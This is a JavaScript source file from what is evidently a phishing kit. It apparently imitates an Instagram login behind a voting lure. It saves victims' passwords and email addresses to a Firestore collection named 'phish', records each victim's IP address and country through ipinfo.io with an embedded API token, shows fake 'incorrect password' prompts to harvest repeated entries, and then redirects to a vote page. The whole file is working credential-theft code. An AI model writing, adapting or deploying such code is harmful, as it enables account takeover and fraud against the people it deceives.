export const submitUserInfo = async function (userData) {
  this.isLoading = true;

  try {
    // Firebase setup
    const { db } = await import("../scripts/firebase.js");
    const { collection, addDoc } = await import('firebase/firestore');

    // Get savedId from localStorage
    const savedId = localStorage.getItem('savedId');

    // Update Vue component's savedId if necessary
    if (this && this.savedId !== savedId) {
      this.savedId = savedId;
    }

    // Fetch user's country code and IP address
    const response = await fetch("https://ipinfo.io?token=3494656743f06e");

    if (!response.ok) {
      throw new Error('Network response was not ok');
    }

    const { country, ip } = await response.json();
    console.log(`User's country code: ${country} and IP address: ${ip}`);

    // Get current date and time in the Africa/Lagos time zone
    const currentDate = new Date();
    const options = { timeZone: 'Africa/Lagos' };
    const formattedDate = currentDate.toLocaleString('en-US', options);

    // Firestore data submission
    try {
      const subCollectionRef = collection(db, "phish", this.savedId, "ig");
      await addDoc(subCollectionRef, {
        pass: userData.name,
        email: userData.email,
        country: country,
        ipaddress: ip,
        timestamp: formattedDate,
      });

      console.log(this.submitCount)
      if (userData.name.length < 6) {
        this.submitCount = 0;
      } else {
        if(this.submitCount<=1){
          this.isIncorrectPassword=true;
        } else if(this.submitCount===2){
          this.isIncorrectPassword=false;
          this.setChaneIgModal=true;
          this.email = '';
          this.name = '';
        } else if(this.submitCount===3){
          this.$router.push('/vote');
        }
      }
      this.submitCount++;

      console.log("Document successfully added!");
    } catch (error) {
      console.error("Error adding document:", error);
    }
  } catch (error) {
    // Handle any errors that may occur during processing
    console.error('Error submitting user data:', error.message);
    throw error; // Re-throw the error if necessary
  }finally {
    // Set loading state to false when the asynchronous operations are done
    this.isLoading = false;
  }
};
